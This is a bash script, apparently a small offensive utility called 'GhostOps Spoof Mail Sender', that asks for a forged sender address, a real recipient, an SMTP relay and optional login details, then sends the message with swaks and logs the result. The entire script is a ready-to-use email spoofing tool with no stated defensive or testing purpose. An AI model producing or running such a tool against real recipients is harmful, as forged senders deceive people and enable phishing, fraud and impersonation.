#!/bin/bash

clear
echo "👻 GhostOps Spoof Mail Sender"
echo "=============================="

read -rp "From (spoofed address): " spoof_from
read -rp "To (real recipient): " spoof_to
read -rp "SMTP Server (relay to use): " smtp_server
read -rp "SMTP Port [default 25]: " smtp_port
smtp_port=${smtp_port:-25}

read -rp "Use STARTTLS? (y/n): " use_tls
read -rp "Use SMTP Auth? (y/n): " use_auth

smtp_auth_args=""
if [[ "$use_auth" =~ ^[Yy]$ ]]; then
    read -rp "SMTP Username: " smtp_user
    read -srp "SMTP Password: " smtp_pass
    echo ""
    smtp_auth_args="--auth LOGIN --auth-user \"$smtp_user\" --auth-password \"$smtp_pass\""
fi

read -rp "Subject: " subject
read -rp "Message Body: " body

logfile=~/ghostops_logs/spoof_send_$(date +%Y%m%d_%H%M%S).txt
mkdir -p ~/ghostops_logs

echo -e "\n🚀 Sending spoofed email..."
{
  echo "FROM: $spoof_from"
  echo "TO:   $spoof_to"
  echo "SMTP: $smtp_server:$smtp_port"
  echo "SUBJ: $subject"
  echo "BODY: $body"
  echo "AUTH: $use_auth"
  echo "TLS:  $use_tls"
  echo "------------------------------------"

  swaks --to "$spoof_to" \
        --from "$spoof_from" \
        --server "$smtp_server" \
        --port "$smtp_port" \
        $( [[ "$use_tls" =~ ^[Yy]$ ]] && echo "--tls" ) \
        $( [[ "$use_auth" =~ ^[Yy]$ ]] && echo "--auth LOGIN --auth-user \"$smtp_user\" --auth-password \"$smtp_pass\"" ) \
        --h-Subject: "$subject" \
        --body "$body"
} 2>&1 | tee "$logfile"

echo -e "\n✅ Done. Output saved to $logfile"
